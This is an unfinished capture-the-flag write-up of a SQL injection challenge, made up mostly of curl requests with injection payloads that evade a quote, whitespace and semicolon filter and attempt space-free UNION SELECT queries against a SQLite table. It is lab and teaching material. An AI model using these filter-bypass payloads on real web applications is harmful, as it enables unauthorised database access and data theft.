# One of These Things (Web, SQL injection) — IN PROGRESS

**Status:** unsolved — boolean-based SQLi confirmed; no working UNION yet.

```bash
curl -s "http://54.72.82.22:8912/u?id=1'"
# → app-level filter: {"blocked": "a quote"}

curl -s "http://54.72.82.22:8912/u?id=1 OR 1=1"
curl -s "http://54.72.82.22:8912/u?id=1%09OR%091=1"   # tab
curl -s "http://54.72.82.22:8912/u?id=1%0aOR%0a1=1"   # newline
# → all blocked: {"blocked": "whitespace"}  (filter catches all whitespace classes)

curl -s "http://54.72.82.22:8912/u?id=1;"
# → blocked: {"blocked": "a blocked symbol"}  (semicolon)

# Confirmed DB is SQLite and reached real query errors (parens/no-space payloads
# pass the app filter and hit the DB):
curl -s "http://54.72.82.22:8912/u?id=(1)or(1=1)"
# → DB error: near "(": syntax error
curl -s "http://54.72.82.22:8912/u?id=1)"
curl -s "http://54.72.82.22:8912/u?id=1)OR(1=1"
# → DB error: near ")": syntax error  (confirms template is flat "id = {value}",
#   no pre-existing wrapping parens)

# Confirmed raw SQL expression evaluation works (no space/quote needed):
curl -s "http://54.72.82.22:8912/u?id=2-1"   # → resolves to profile id=1 (The Editors)
curl -s "http://54.72.82.22:8912/u?id=1=1"   # → also resolves to profile id=1
curl -s "http://54.72.82.22:8912/u?id=(1)"   # → resolves cleanly, no error

# NOTE: literal "+" in a URL query string decodes server-side to a space —
# curl -s "http://54.72.82.22:8912/u?id=0+1" got blocked as "whitespace"
# even though no space was typed; use %2B or avoid + entirely.

# In-progress UNION attempts (not yet successful):
curl -s "http://54.72.82.22:8912/u?id=0)UNION(SELECT(1))--"
curl -s "http://54.72.82.22:8912/u?id=-1)UNION(SELECT(1),(2),(3),(4))--"
curl -s "http://54.72.82.22:8912/u?id=-1UNION(SELECT(1),(2),(3),(4))"
```

**Status:** Boolean-based SQLi confirmed and reliable; still iterating on a
working no-space/no-quote UNION SELECT to pull data from the hidden "shed" drafts
table referenced in the challenge's flavor text.
